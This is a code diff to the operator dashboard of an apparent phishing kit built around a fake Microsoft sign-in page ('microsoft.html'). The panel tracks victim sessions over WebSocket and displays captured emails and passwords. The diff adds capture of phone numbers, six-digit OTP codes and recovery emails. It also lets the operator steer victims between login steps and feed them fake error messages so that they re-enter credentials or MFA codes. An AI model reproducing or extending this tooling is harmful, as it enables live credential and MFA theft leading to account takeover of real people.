     el.innerHTML = `<div><span class="log-ts">${ts}</span> <span class="${cls}">[${tag}]</span> ${msg}</div>` + el.innerHTML;
     eventCount++; document.getElementById('stat-events').textContent = eventCount;
   }
@@ -331,19 +405,23 @@
     const keys = Object.keys(sessions).sort((a,b) => sessions[b].lastSeen - sessions[a].lastSeen);
     document.getElementById('stat-sessions').textContent = keys.length;
     document.getElementById('session-count').textContent = keys.length;
-    if (!keys.length) { el.innerHTML = '<div class="empty">No sessions yet — waiting for clients to connect.</div>'; return; }
+    if (!keys.length) { el.innerHTML = '<div class="empty-msg">No sessions yet — waiting for clients to connect.</div>'; return; }
     el.innerHTML = keys.map(k => {
       const it = sessions[k];
       const t  = new Date(it.lastSeen||Date.now()).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit',second:'2-digit'});
       return `<div class="session-card${k===selectedSession?' selected':''}" onclick="selectSession('${k}')">
-        <div class="session-top"><div class="session-id">${k}</div><div class="session-time">${t}</div></div>
-        <div class="session-email">Email: ${it.email||'<span style="color:#bbb">not yet captured</span>'}</div>
-        <div class="session-password">Password: ${it.password||'<span style="color:#bbb">not yet captured</span>'}</div>
-        <span class="session-step">${it.lastEvent||'connected'}</span>
-        <div class="session-btns">
+        <div class="sess-top"><div class="sess-id">${k}</div><div class="sess-time">${t}</div></div>
+        <div class="sess-email">Email: ${it.email||'<span style="color:#bbb">not yet captured</span>'}</div>
+        <div class="sess-password">Password: ${it.password||'<span style="color:#bbb">not yet captured</span>'}</div>
+        <div class="sess-password">Phone: ${it.phone||'<span style="color:#bbb">not yet captured</span>'}</div>
+        <div class="sess-password">Code: ${it.six_code||'<span style="color:#bbb">not yet captured</span>'}</div>
+        <div class="sess-password">Recovery-Email: ${it.recovery||'<span style="color:#bbb">not yet captured</span>'}</div>
+        <div><span class="sess-step">${it.lastEvent||'connected'}</span></div>
+        <div class="sess-btns">
           <button class="mini-btn" onclick="event.stopPropagation();quickNav('${k}','verify')">→ verify</button>
-          <button class="mini-btn" onclick="event.stopPropagation();quickNav('${k}','password')">→ password</button>
+          <button class="mini-btn" onclick="event.stopPropagation();quickNav('${k}','phone')">→ phone</button>
           <button class="mini-btn" onclick="event.stopPropagation();quickNav('${k}','code')">→ code</button>
+          <button class="mini-btn" onclick="event.stopPropagation();quickNav('${k}','password')">→ password</button>
         </div>
       </div>`;
     }).join('');
@@ -355,74 +433,62 @@
     document.getElementById('stat-selected').textContent = sid;
     renderSessions(); log('selected ' + sid);
   }
-
-  function quickNav(sid, step) {
-    send({ type: 'navigate_to_step', sessionId: sid, step });
-    log(`navigate ${sid} → ${step}`);
-  }
+  function quickNav(sid, step) { send({ type: 'navigate_to_step', sessionId: sid, step }); log(`navigate ${sid} → ${step}`); }
 
   function send(obj) {
-    if (!socket || socket.readyState !== WebSocket.OPEN) { alert('Not connected'); return; }
+    if (!socket || socket.readyState !== WebSocket.OPEN) { alert('Not connected to server.'); return; }
     try { socket.send(JSON.stringify(obj)); } catch(e) {}
   }
 
   function buildContent() {
     const v = id => document.getElementById(id).value.trim();
-    const content = {};
-    if (v('field-title'))             content.title             = v('field-title');
-    if (v('field-subtitle'))          content.subtitle          = v('field-subtitle');
-    if (v('field-verifyNumber'))      content.verifyNumber      = v('field-verifyNumber');
-    if (v('field-phoneInfoLabel'))    content.phoneInfoLabel    = v('field-phoneInfoLabel');
-    if (v('field-phoneInfoValue'))    content.phoneInfoValue    = v('field-phoneInfoValue');
-    if (v('field-recoveryInfoLabel')) content.recoveryInfoLabel = v('field-recoveryInfoLabel');
-    if (v('field-recoveryInfoValue')) content.recoveryInfoValue = v('field-recoveryInfoValue');
-    // Error is NOT included in buildContent — it has its own dedicated button
-    return content;
+    const c = {};
+    if (v('field-title'))         c.title         = v('field-title');
+    if (v('field-subtitle'))      c.subtitle       = v('field-subtitle');
+    if (v('field-verifyNumber'))  c.verifyNumber   = v('field-verifyNumber');
+    if (v('field-phoneNumber'))   c.phoneNumber    = v('field-phoneNumber');
+    if (v('field-recoveryEmail')) c.recoveryEmail  = v('field-recoveryEmail');
+    return c;
   }
 
-  // Get the currently chosen error message (preset or custom)
   function getErrorMessage() {
     const sel = document.getElementById('field-errorSelect').value;
     if (sel === '__custom__') return document.getElementById('field-errorCustom').value.trim();
     return sel;
   }
 
-  // ── UPDATE CONTENT (no navigation, no error)
   document.getElementById('btnUpdate').addEventListener('click', () => {
     const sid  = document.getElementById('targetSession').value.trim();
     const step = document.getElementById('targetStep').value;
-    if (!sid) return alert('Select a session first');
+    if (!sid) return alert('Select a session first.');
     const content = buildContent();
-    if (!Object.keys(content).length) return alert('Fill in at least one content field to update.');
+    if (!Object.keys(content).length) return alert('Fill in at least one content field.');
     send({ type: 'update_content', sessionId: sid, step, content });
     log(`update_content → ${sid} / step-${step}`, 'admin');
   });
 
-  // ── NAVIGATE (go to step + apply content, no error)
   document.getElementById('btnNavigate').addEventListener('click', () => {
     const sid  = document.getElementById('targetSession').value.trim();
     const step = document.getElementById('targetStep').value;
-    if (!sid) return alert('Select a session first');
-    const content = buildContent();
-    send({ type: 'navigate_to_step', sessionId: sid, step, content });
+    if (!sid) return alert('Select a session first.');
+    send({ type: 'navigate_to_step', sessionId: sid, step, content: buildContent() });
     log(`navigate_to_step → ${sid} / step-${step}`, 'admin');
   });
 
-  // ── SEND ERROR (dedicated button — sends only the error, no nav)
   document.getElementById('btnSendError').addEventListener('click', () => {
     const sid  = document.getElementById('targetSession').value.trim();
     const step = document.getElementById('targetStep').value;
-    if (!sid) return alert('Select a session first');
+    if (!sid) return alert('Select a session first.');
     const err = getErrorMessage();
-    if (!err) return alert('Select or type an error message first.');
+    if (!err) return alert('Select or type an error message.');
     send({ type: 'update_content', sessionId: sid, step, content: { error: err } });
     log(`send_error → ${sid} / step-${step}: "${err}"`, 'err');
   });
 
   document.getElementById('btnAssignCode').addEventListener('click', () => {
     const sid = document.getElementById('targetSession').value.trim();
-    if (!sid) return alert('Select a session first');
-    const code = prompt('Enter 6-digit OTP to assign to ' + sid + ':');
+    if (!sid) return alert('Select a session first.');
+    const code = prompt('Enter 6-digit OTP code:');
     if (!code) return;
     send({ type: 'code_assigned', sessionId: sid, code });
     log(`code_assigned ${code} → ${sid}`, 'admin');
@@ -430,12 +496,12 @@
 
   function setWs(on) {
     document.getElementById('wsDot').className = 'ws-dot' + (on ? ' on' : '');
-    document.getElementById('wsLabel').textContent = on ? 'Connected' : 'Disconnected';
+    document.getElementById('wsLabel').textContent = on ? 'Connected to ' + wsUrl : 'Disconnected';
   }
 
   function init() {
-    socket = new WebSocket(wsUrl);
-    socket.onopen = () => { setWs(true); socket.send(JSON.stringify({ type: 'connect', admin: true, role: 'admin' })); };
+    try { socket = new WebSocket(wsUrl); } catch(e) { log('bad URL: ' + e.message, 'err'); return; }
+    socket.onopen  = () => { setWs(true); socket.send(JSON.stringify({ type: 'connect', admin: true, role: 'admin' })); };
     socket.onmessage = (ev) => {
       try {
         const data = JSON.parse(ev.data);
@@ -443,77 +509,45 @@
           const sid = data.fromSession;
           sessions[sid] = Object.assign({}, sessions[sid]||{}, { lastSeen: Date.now(), lastEvent: data.step||data.type });
           if (data.email)    sessions[sid].email    = data.email;
+          if (data.phone)    sessions[sid].phone    = data.phone;
+          if (data.six_code) sessions[sid].six_code = data.six_code;
+          if (data.recovery) sessions[sid].recovery = data.recovery;
           if (data.password) sessions[sid].password = data.password;
           renderSessions(); log(`${sid.slice(0,14)}… → ${data.type}`, 'client'); return;
         }
         if (data.type === 'server_sessions') {
           sessions = Object.assign({}, data.sessions||{});
-          Object.keys(sessions).forEach(sid => { sessions[sid].lastSeen = sessions[sid].lastSeen||Date.now(); });
+          Object.keys(sessions).forEach(k => { sessions[k].lastSeen = sessions[k].lastSeen||Date.now(); });
           renderSessions(); log(`synced ${Object.keys(sessions).length} session(s)`, 'server');
         } else if (data.type === 'client_connected') {
           sessions[data.sessionId] = Object.assign({}, sessions[data.sessionId]||{}, { lastSeen: data.lastSeen||Date.now(), lastEvent: 'connected' });
           renderSessions(); log('new client: ' + data.sessionId, 'server');
         } else if (data.type === 'client_disconnected') {
           delete sessions[data.sessionId];
-          if (selectedSession === data.sessionId) { selectedSession = null; document.getElementById('targetSession').value=''; document.getElementById('stat-selected').textContent='—'; }
-          renderSessions(); log('client disconnected: ' + data.sessionId, 'server');
-        } else if (data.type === 'ok') {
-          log(`delivered to ${data.sessionId||'all'}`, 'server');
-        } else if (data.type === 'error') {
-          log(`${data.message} (${data.sessionId})`, 'err');
-        } else if (data.type === 'connected' && data.role === 'admin') {
-          log('admin session ready', 'server');
+          if (selectedSession === data.sessionId) { selectedSession = null; document.getElementById('targetSession').value = ''; document.getElementById('stat-selected').textContent = '—'; }
+          renderSessions(); log('disconnected: ' + data.sessionId, 'server');
+        } else if (data.type === 'ok')    { log(`delivered to ${data.sessionId||'all'}`, 'server');
+        } else if (data.type === 'error') { log(data.message, 'err');
+        } else if (data.type === 'connected' && data.role === 'admin') { log('admin session ready — server: ' + wsUrl, 'server');
         } else { log(data.type||JSON.stringify(data), 'server'); }
       } catch(e) { log('parse error: ' + e.message, 'err'); }
     };
-    socket.onclose = () => { setWs(false); log('disconnected — reconnecting…', 'err'); setTimeout(init, 2000); };
-    socket.onerror = () => {};
+    socket.onclose = () => { setWs(false); log('disconnected — reconnecting in 3s…', 'err'); setTimeout(init, 3000); };
+    socket.onerror = (e) => { log('ws error', 'err'); };
   }
   init();
 </script>
 
-<!-- ═══════════════════════ EDITOR UI ═══════════════════════ -->
+<!-- ══════════════════ EDITOR UI ══════════════════ -->
 <script>
-  // Error presets per step
   const ERROR_PRESETS = {
-    email: [
-      "That email address doesn't exist. Please try again.",
-      "Please enter a valid email address.",
-      "Your account has been locked. Contact support.",
-      "Too many attempts. Please try again later.",
-    ],
-    password: [
-      "That password is incorrect. Please try again.",
-      "Your account is temporarily locked.",
-      "Password must be at least 8 characters.",
-      "Too many failed attempts. Please reset your password.",
-    ],
-    verify: [
-      "Verification timed out. Please try again.",
-      "Approval denied. Please try a different method.",
-      "Notification could not be sent to your device.",
-    ],
-    phone: [
-      "This phone number is not associated with an account.",
-      "Too many requests. Please wait before trying again.",
-      "Unable to send SMS. Please try another method.",
-    ],
-    code: [
-      "That code is incorrect. Please try again.",
-      "The code has expired. Please request a new one.",
-      "Please enter the full 6-digit code.",
-      "Too many incorrect attempts.",
-    ],
-    recovery: [
-      "This recovery email is not associated with your account.",
-      "Unable to send email. Please try another method.",
-      "Too many requests. Please wait before trying again.",
-    ],
-    security: [
-      "That security code is incorrect. Please try again.",
-      "Security code has expired.",
-      "Please enter the code shown in the Authenticator app.",
-    ],
+    email:    ["Please enter a valid email address.", "That email doesn't exist. Try again.", "Account is locked. Contact support.", "Too many attempts. Try again later."],
+    password: ["Your account or password is incorrect.", "Account is temporarily locked.", "Too many failed attempts. Please reset your password."],
+    verify:   ["Verification timed out. Please try again.", "Approval denied. Use a different method.", "Notification could not be sent."],
+    phone:    ["This phone number is not on file.", "Too many requests. Please wait.", "Unable to send SMS. Try another method."],
+    code:     ["That code is incorrect. Please try again.", "The code has expired. Request a new one.", "Please enter the full 6-digit code.", "Too many incorrect attempts."],
+    recovery: ["This recovery email is not on file.", "Unable to send email. Try another method.", "Too many requests. Please wait."],
+    security: ["That security code is incorrect.", "Security code has expired.", "Please enter the code from the Authenticator app."],
   };
 
   const STEP_EXTRAS = {
@@ -525,36 +559,35 @@
   function onStepChange() {
     const step = document.getElementById('targetStep').value;
     document.getElementById('stepBannerName').textContent = step;
-
-    // Toggle extra sections
     document.querySelectorAll('.step-extra').forEach(el => el.style.display = 'none');
-    (STEP_EXTRAS[step] || []).forEach(id => {
-      const el = document.getElementById(id);
-      if (el) el.style.display = '';
-    });
-
-    // Rebuild error dropdown for this step
-    const sel    = document.getElementById('field-errorSelect');
-    const presets = ERROR_PRESETS[step] || [];
+    (STEP_EXTRAS[step] || []).forEach(id => { const el = document.getElementById(id); if (el) el.style.display = ''; });
+    const sel = document.getElementById('field-errorSelect');
     sel.innerHTML = '<option value="">— no error —</option>';
-    presets.forEach(msg => {
+    (ERROR_PRESETS[step] || []).forEach(msg => {
       const opt = document.createElement('option');
-      opt.value = msg; opt.textContent = msg;
-      sel.appendChild(opt);
+      opt.value = msg; opt.textContent = msg; sel.appendChild(opt);
     });
-    // Always add Custom option at end
-    const customOpt = document.createElement('option');
-    customOpt.value = '__custom__'; customOpt.textContent = 'Custom…';
-    sel.appendChild(customOpt);
-
-    // Reset custom row
+    const c = document.createElement('option'); c.value = '__custom__'; c.textContent = 'Custom…'; sel.appendChild(c);
     document.getElementById('customErrorRow').classList.remove('show');
     document.getElementById('field-errorCustom').value = '';
   }
 
   function onErrorSelectChange() {
-    const val = document.getElementById('field-errorSelect').value;
-    document.getElementById('customErrorRow').classList.toggle('show', val === '__custom__');
+    document.getElementById('customErrorRow').classList.toggle('show', document.getElementById('field-errorSelect').value === '__custom__');
+  }
+
+  function updatePhonePreview() {
+    const val = document.getElementById('field-phoneNumber').value.trim();
+    const prev = document.getElementById('phone-preview');
+    if (!val) { prev.textContent = '(•••) ••••-••49'; return; }
+    prev.textContent = /^\d{1,4}$/.test(val) ? `(•••) ••••-••${val}` : val;
+  }
+
+  function updateRecoveryPreview() {
+    const val  = document.getElementById('field-recoveryEmail').value.trim();
+    const prev = document.getElementById('recovery-preview');
+    if (!val) { prev.textContent = 'reu•••••••@gmail.com'; return; }
+    prev.textContent = (val.includes('@') || val.includes('•')) ? val : `usr•••••••@${val}`;
   }
 
   function clearField(id) {
@@ -567,44 +600,36 @@
 
   function clearAllFields() {
     ['field-title','field-subtitle','field-verifyNumber',
-     'field-phoneInfoLabel','field-phoneInfoValue',
-     'field-recoveryInfoLabel','field-recoveryInfoValue',
-     'field-errorCustom'
+     'field-phoneNumber','field-recoveryEmail','field-errorCustom'
     ].forEach(id => { document.getElementById(id).value = ''; });
     document.getElementById('field-errorSelect').value = '';
     document.getElementById('customErrorRow').classList.remove('show');
+    updatePhonePreview(); updateRecoveryPreview();
   }
 
-  // Init
   onStepChange();
 </script>
 
-<!-- ═══════════════════════ PHASE LOADER ═══════════════════════ -->
+<!-- ══════════════════ PHASE LOADER ══════════════════ -->
 <script>
 (function () {
-  function plainText(el) {
-    return el ? (el.textContent||'').trim().replace(/\s+/g,' ') : '';
-  }
+  function plainText(el) { return el ? (el.textContent||'').trim().replace(/\s+/g,' ') : ''; }
 
   function extractStep(stepEl, name) {
     const payload = {};
-    const h2  = stepEl.querySelector('h2');
-    const sub = stepEl.querySelector('.subtitle');
-    const vn  = stepEl.querySelector('.verify-number');
-    if (h2  && plainText(h2))  payload.title        = plainText(h2);
-    if (sub && plainText(sub)) payload.subtitle     = plainText(sub);
-    if (vn  && plainText(vn))  payload.verifyNumber = plainText(vn);
+    const h1  = stepEl.querySelector('h1');
+    const sub = stepEl.querySelector('.step-subtitle');
+    const vn  = stepEl.querySelector('.verify-num');
+    if (h1  && plainText(h1))  payload.title        = plainText(h1);
+    if (sub && plainText(sub)) payload.subtitle      = plainText(sub);
+    if (vn  && plainText(vn))  payload.verifyNumber  = plainText(vn);
     if (name === 'phone') {
-      const lbl = stepEl.querySelector('#phone-info-label');
       const val = stepEl.querySelector('#phone-info-value');
-      if (lbl && plainText(lbl)) payload.phoneInfoLabel = plainText(lbl);
-      if (val && plainText(val)) payload.phoneInfoValue = plainText(val);
+      if (val && plainText(val)) payload.phoneNumber = plainText(val);
     }
     if (name === 'recovery') {
-      const lbl = stepEl.querySelector('#recovery-info-label');
       const val = stepEl.querySelector('#recovery-info-value');
-      if (lbl && plainText(lbl)) payload.recoveryInfoLabel = plainText(lbl);
-      if (val && plainText(val)) payload.recoveryInfoValue = plainText(val);
+      if (val && plainText(val)) payload.recoveryEmail = plainText(val);
     }
     return payload;
   }
@@ -614,13 +639,12 @@
     const opt = Array.from(sel.options).find(o => o.value === name);
     if (opt) sel.value = name;
     onStepChange();
-    document.getElementById('field-title').value            = payload.title             || '';
-    document.getElementById('field-subtitle').value         = payload.subtitle          || '';
-    document.getElementById('field-verifyNumber').value     = payload.verifyNumber      || '';
-    document.getElementById('field-phoneInfoLabel').value   = payload.phoneInfoLabel    || '';
-    document.getElementById('field-phoneInfoValue').value   = payload.phoneInfoValue    || '';
-    document.getElementById('field-recoveryInfoLabel').value= payload.recoveryInfoLabel || '';
-    document.getElementById('field-recoveryInfoValue').value= payload.recoveryInfoValue || '';
+    document.getElementById('field-title').value        = payload.title        || '';
+    document.getElementById('field-subtitle').value     = payload.subtitle     || '';
+    document.getElementById('field-verifyNumber').value = payload.verifyNumber || '';
+    document.getElementById('field-phoneNumber').value  = payload.phoneNumber  || '';
+    document.getElementById('field-recoveryEmail').value = payload.recoveryEmail || '';
+    updatePhonePreview(); updateRecoveryPreview();
     document.getElementById('phaseModal').classList.remove('open');
     log(`loaded step "${name}" into editor`, 'admin');
   }
@@ -629,9 +653,8 @@
     const list = document.getElementById('phaseList');
     list.innerHTML = '';
     if (!steps.length) {
-      list.innerHTML = '<p style="color:#bbb;font-size:0.85rem;">No steps found in microsoft.html.</p>';
-      document.getElementById('phaseModal').classList.add('open');
-      return;
+      list.innerHTML = '<p style="color:#bbb;font-size:0.85rem;font-family:Arial,sans-serif;">No steps found in microsoft.html.</p>';
+      document.getElementById('phaseModal').classList.add('open'); return;
     }
     steps.forEach(({ name, payload }) => {
       const item = document.createElement('div');
@@ -639,8 +662,7 @@
       item.innerHTML = `
         <div class="phase-item-name">step-${name}</div>
         <div class="phase-item-title">${payload.title||'(no title)'}</div>
-        <div class="phase-item-sub">${payload.subtitle||payload.phoneInfoValue||payload.recoveryInfoValue||''}</div>
-      `;
+        <div class="phase-item-sub">${payload.subtitle||payload.phoneNumber||payload.recoveryEmail||''}</div>`;
       item.addEventListener('click', () => applyToFields(name, payload));
       list.appendChild(item);
     });
@@ -652,19 +674,16 @@
     try {
       const res = await fetch('microsoft.html', { cache: 'no-store' });
       if (!res.ok) throw new Error(`HTTP ${res.status}`);
-      const html = await res.text();
-      const doc  = new DOMParser().parseFromString(html, 'text/html');
-      let stepEls = Array.from(doc.querySelectorAll('.step[id^="step-"]'));
-      if (!stepEls.length) stepEls = Array.from(doc.querySelectorAll('[id^="step-"]'));
-      if (!stepEls.length) throw new Error('No .step[id^="step-"] elements found.');
-      const steps = stepEls
-        .map(el => ({ name: el.id.replace(/^step-/,''), payload: extractStep(el, el.id.replace(/^step-/,'')) }))
-        .filter(s => Object.keys(s.payload).length > 0);
+      const doc   = new DOMParser().parseFromString(await res.text(), 'text/html');
+      let els     = Array.from(doc.querySelectorAll('.step[id^="step-"]'));
+      if (!els.length) els = Array.from(doc.querySelectorAll('[id^="step-"]'));
+      if (!els.length) throw new Error('No .step[id^="step-"] elements found.');
+      const steps = els.map(el => ({ name: el.id.replace(/^step-/,''), payload: extractStep(el, el.id.replace(/^step-/,'')) }))
+                       .filter(s => Object.keys(s.payload).length > 0);
       log(`found ${steps.length} step(s)`, 'admin');
       showModal(steps);
-    } catch (err) {
-      console.error('[loadPhases]', err);
-      log('load failed: ' + err.message, 'err');
+    } catch(err) {
+      console.error(err); log('load failed: ' + err.message, 'err');
       alert('Could not load microsoft.html:\n\n' + err.message);
     }
   }
@@ -675,6 +694,5 @@
   window.loadPhases = loadPhases;
 })();
 </script>
-
 </body>
 </html>
